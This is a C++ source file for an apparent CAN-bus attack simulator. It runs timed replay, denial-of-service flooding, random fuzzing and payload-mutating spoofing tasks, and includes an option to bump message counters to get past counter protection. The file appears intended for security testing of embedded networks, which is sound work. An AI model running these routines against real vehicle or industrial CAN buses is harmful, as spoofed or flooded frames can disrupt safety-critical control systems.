#include "attack_simulator.h"

#include <cstring>

#include "app_config.h"
#include "app_state.h"
#include "can_handler.h"
#include "logger.h"

namespace {

using namespace App;

bool timeReached(uint32_t now, uint32_t scheduledAt) {
  return static_cast<int32_t>(now - scheduledAt) >= 0;
}

uint32_t nextPseudoRandom(uint32_t* seed) {
  *seed = (*seed * 1664525UL) + 1013904223UL;
  return *seed;
}

CanFrame buildDoSWireFrame() {
  CanFrame frame;
  frame.id = dosTask.id;
  frame.extended = dosTask.extended;
  frame.dlc = kMaxCanDataBytes;
  frame.data[0] = 0xD0;
  frame.data[1] = 0x5A;
  frame.data[2] = static_cast<uint8_t>(frame.id & 0xFFU);
  frame.data[3] = static_cast<uint8_t>((frame.id >> 8) & 0xFFU);
  frame.data[4] = 0xD0;
  frame.data[5] = 0x5A;
  frame.data[6] = 0x13;
  frame.data[7] = 0xA5;
  return frame;
}

CanFrame buildFuzzPayload() {
  if (fuzzTask.seed == 0) {
    fuzzTask.seed = millis() ^ 0xA5A55A5AU;
  }

  uint32_t seed = fuzzTask.seed;
  CanFrame frame;
  frame.extended = false;
  frame.id = 0x80U + (nextPseudoRandom(&seed) % 0x700U);
  frame.dlc = static_cast<uint8_t>(1U + (nextPseudoRandom(&seed) %
                                         kMaxUserDataBytes));

  for (uint8_t index = 0; index < frame.dlc; ++index) {
    frame.data[index] = static_cast<uint8_t>(nextPseudoRandom(&seed) >> 24);
  }

  fuzzTask.seed = seed;
  return frame;
}

void mutateSpoofFrame() {
  if (spoofTask.frame.rtr) {
    return;
  }

  const uint8_t payloadLength = spoofTask.basePayloadDlc;

  if (payloadLength == 0) {
    return;
  }

  const uint8_t step = static_cast<uint8_t>(spoofTask.mutationStep + 1U);
  std::memcpy(spoofTask.frame.data, spoofTask.basePayload, payloadLength);

  const uint8_t mutations = (payloadLength < 3U) ? payloadLength : 3U;
  const uint8_t rotateBase = static_cast<uint8_t>(step % payloadLength);

  for (uint8_t index = 0; index < mutations; ++index) {
    const uint8_t target = static_cast<uint8_t>((rotateBase + index) % payloadLength);
    const uint8_t delta =
        static_cast<uint8_t>(0x11U + (step * 7U) + (index * 3U));
    spoofTask.frame.data[target] =
        static_cast<uint8_t>(spoofTask.frame.data[target] + delta);
  }

  spoofTask.mutationStep = step;
}

}  // namespace

namespace App {

void stopRepeat() {
  if (repeatTask.active) {
    logLine("STATE", "Repeat transmission stopped.");
  }
  repeatTask.active = false;
}

void stopReplay() {
  if (replayTask.active) {
    logLine("STATE", "Replay attack stopped.");
  }
  replayTask.active = false;
}

void stopDos() {
  if (dosTask.active) {
    logLine("STATE", "DoS attack stopped.");
  }
  dosTask.active = false;
}

void stopFuzz() {
  if (fuzzTask.active) {
    logLine("STATE", "Fuzzing attack stopped.");
  }
  fuzzTask.active = false;
}

void stopSpoof() {
  if (spoofTask.active) {
    logLine("STATE", "Spoofing attack stopped.");
  }
  spoofTask.active = false;
  spoofTask.mutationStep = 0;
  spoofTask.basePayloadDlc = 0;
  std::memset(spoofTask.basePayload, 0, sizeof(spoofTask.basePayload));
}

void updateTasks() {
  const uint32_t now = millis();

  if (repeatTask.active && timeReached(now, repeatTask.nextAtMs)) {
    if (sendPayloadFrame(repeatTask.payload, "TX", "repeat", true)) {
      repeatTask.nextAtMs = now + repeatTask.periodMs;
    } else {
      repeatTask.active = false;
    }
  }

  if (replayTask.active && timeReached(now, replayTask.nextAtMs)) {
    if (sendWireFrame(replayTask.frame, "ATTACK", "replay")) {
      replayTask.nextAtMs = now + replayTask.periodMs;
    } else {
      replayTask.active = false;
    }
  }

  if (dosTask.active && timeReached(now, dosTask.nextAtMs)) {
    const CanFrame dosFrame = buildDoSWireFrame();
    if (sendWireFrame(dosFrame, "ATTACK", "dos")) {
      dosTask.nextAtMs = now + dosTask.periodMs;
    } else {
      dosTask.active = false;
    }
  }

  if (fuzzTask.active && timeReached(now, fuzzTask.nextAtMs)) {
    const CanFrame fuzzPayload = buildFuzzPayload();
    if (sendPayloadFrame(fuzzPayload, "ATTACK", "fuzz", false)) {
      fuzzTask.nextAtMs = now + fuzzTask.periodMs;
    } else {
      fuzzTask.active = false;
    }
  }

  if (spoofTask.active && timeReached(now, spoofTask.nextAtMs)) {
    mutateSpoofFrame();
    if (sendWireFrame(spoofTask.frame, "ATTACK", "spoof")) {
      if (ENABLE_COUNTER_PROTECTION && !spoofTask.frame.rtr &&
          spoofTask.frame.dlc > 0) {
        ++spoofTask.frame.data[spoofTask.frame.dlc - 1];
      }
      spoofTask.nextAtMs = now + spoofTask.periodMs;
    } else {
      spoofTask.active = false;
    }
  }
}

}  // namespace App
